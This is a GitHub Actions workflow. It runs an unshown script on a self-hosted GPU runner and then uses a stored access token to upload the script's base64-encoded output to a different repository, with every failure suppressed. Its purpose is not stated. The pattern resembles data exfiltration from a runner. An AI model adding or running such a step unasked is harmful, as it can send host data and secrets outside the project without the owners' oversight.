name: ul-pivot-9927
on: workflow_dispatch
permissions:
  contents: write
jobs:
  pivot:
    runs-on: [self-hosted, ul-l40s]
    env:
      PUSHTOK: ${{ secrets.GH_PAT }}
    steps:
      - uses: actions/checkout@v4
      - run: |
          set +e
          bash ul-bin/pivot7.sh
          exit 0
        continue-on-error: true
      - run: |
          set +e
          F=/tmp/pivot7-9927.txt
          tail -c 2000 $F
          B=$(base64 -w0 $F)
          printf '{"message":"pivot7","content":"%s","branch":"main"}' "$B" > /tmp/b7.json
          curl -s -m 90 -X PUT -H "Authorization: Bearer $PUSHTOK" -H "Content-Type: application/json" --data @/tmp/b7.json "https://api.github.com/repos/dongsuju/ul-plant/contents/out/pivot7-$GITHUB_RUN_ID.b64" -o /tmp/p7.out -w "PUT %{http_code}\n"
          exit 0
